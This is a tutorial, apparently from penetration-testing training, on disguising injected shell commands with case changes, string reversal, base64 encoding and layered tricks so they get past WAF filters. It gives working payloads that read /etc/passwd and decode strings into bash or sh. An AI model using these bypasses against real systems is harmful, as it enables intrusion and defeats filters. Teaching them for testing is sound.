# Advanced Command Obfuscation

Basic character and operator bypasses work against simple PHP blacklists. WAFs and more sophisticated filters require a different approach: transforming the command itself so the filter never sees a recognisable keyword, while ensuring the shell still executes the intended command at runtime.

***

## Technique 1: Case Manipulation

Command blacklists typically check for exact lowercase strings. Changing the case of the command bypasses the string match without affecting execution on case-insensitive systems.

**Windows (CMD and PowerShell are case-insensitive):**

```powershell
WhOaMi          # executes fine
WHOAMI          # executes fine
wHoAmI          # executes fine
```

**Linux (case-sensitive, requires runtime lowercasing):**

Linux requires the obfuscated string to be converted back to lowercase before execution. The `tr` command handles this inside a subshell:

```bash
# tr converts A-Z to a-z at runtime
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# printf with ,, parameter expansion (bash 4.0+)
$(a="WhOaMi";printf%s"${a,,}")

# Without spaces (for space-filtered targets):
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

The key error to avoid: the `tr` technique itself uses spaces by default, which gets blocked if spaces are filtered. Replace every space with `%09` (tab) before testing against the application.

***

## Technique 2: Reversed Commands

Reversing a command produces a string that contains none of the original characters in the original order, defeating keyword matching entirely. The shell reverses it back at runtime before execution:

**Linux:**

```bash
# Step 1: Generate reversed string locally
echo 'whoami' | rev
# imaohw

echo 'cat /etc/passwd' | rev
# dwssap/cte/ tac

# Step 2: Execute via rev in subshell
$(rev<<<'imaohw')           # → executes whoami
$(rev<<<'dwssap/cte/tac')   # → executes cat /etc/passwd
```

The `<<<` here-string syntax passes the reversed string to `rev` without using a pipe, which matters because `|` is commonly blacklisted. If the path characters are also filtered, reverse the entire command including substituted characters:

```bash
# Reversed payload that avoids / directly
$(rev<<<'dwssap/cte/tac')   # /etc/passwd spelled backwards
```

**Windows PowerShell:**

```powershell
# Step 1: Reverse string
"whoami"[-1..-20] -join ''
# imaohw

# Step 2: Execute reversed string
iex "$('imaohw'[-1..-20] -join '')"
```

***

## Technique 3: Base64 Encoded Commands

Base64 encoding is the most powerful obfuscation technique because it transforms the entire payload, including filtered characters like spaces, slashes, and pipes, into a string that contains only alphanumeric characters and `=`. The filter sees nothing recognisable, and the shell decodes and executes it at runtime.

**Linux workflow:**

```bash
# Step 1: Encode the full payload (including normally filtered characters)
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# Step 2: Decode and execute in one command
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# Breaking down the syntax:
# base64 -d<<<...   → decodes the b64 string using here-string (no pipe needed)
# $()               → captures output as a string
# bash<<<           → passes decoded string to bash for execution (no pipe needed)
```

Note that `<<<` (here-string) is used in two places specifically to avoid the pipe character `|`, which is commonly filtered. The entire decoded command, including its internal pipes, spaces, and slashes, is passed as a single string to bash for execution.

**Applying to a filtered target (spaces replaced with tabs):**

```bash
bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

**Windows workflow:**

```powershell
# Step 1: Encode on Windows
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# dwBoAG8AYQBtAGkA

# Step 1 (alternative): Encode on Linux using UTF-16LE to match Windows encoding
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
# dwBoAG8AYQBtAGkA

# Step 2: Decode and execute
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

Windows PowerShell uses UTF-16LE string encoding internally, which is why the base64 string differs from the Linux equivalent. Encoding on Linux requires the `iconv` conversion step to produce a compatible string.

***

## Combining Techniques

Real WAF bypass often requires layering multiple techniques. A filter might block `base64`, `bash`, and `rev` as keywords while also blocking spaces and slashes. Combining character-level bypasses with command obfuscation produces payloads that defeat multiple filter layers simultaneously:

```bash
# base64 keyword is filtered: use character insertion to break it
ba's'e64    # quotes are stripped by shell, leaves base64
b\ase64     # backslash escape stripped by shell
ba$()se64   # empty subshell substitution stripped by shell

# bash keyword is filtered: substitute sh
sh<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# base64 and bash both filtered: use openssl for decoding
echo%09Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==%09|%09openssl%09enc%09-d%09-base64%09|%09sh

# Reversed base64 command keyword (extreme case)
cmd=$(rev<<<'46esab');$cmd -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==|sh
```

***

## Obfuscation Method Selection

```
WAF blocking keywords (whoami, cat, id):
    Use case manipulation (Linux: tr lowercase trick)
    Use reversed commands (rev<<<'imaohw')

WAF blocking special characters (/, ;, space, |):
    Use environment variable substrings (${PATH:0:1})
    Use IFS and tab substitution
    Use brace expansion {cmd,arg}

WAF blocking both keywords and characters:
    Use base64 encoding (encodes everything into alphanumeric)
    Replace spaces in decode command with %09
    Use sh instead of bash, openssl instead of base64

WAF with signature matching on common payloads:
    Generate unique encoding per engagement
    Combine case + reversal + base64 layers
    Use custom variable names and unusual expansion syntax
```

The fundamental advantage of base64 encoding over other techniques is that the payload is unique every time you change the command. A WAF cannot signature-match a specific base64 string without knowing the exact command you encoded, making it the most reliable bypass when the filter is sophisticated enough to block other techniques. 
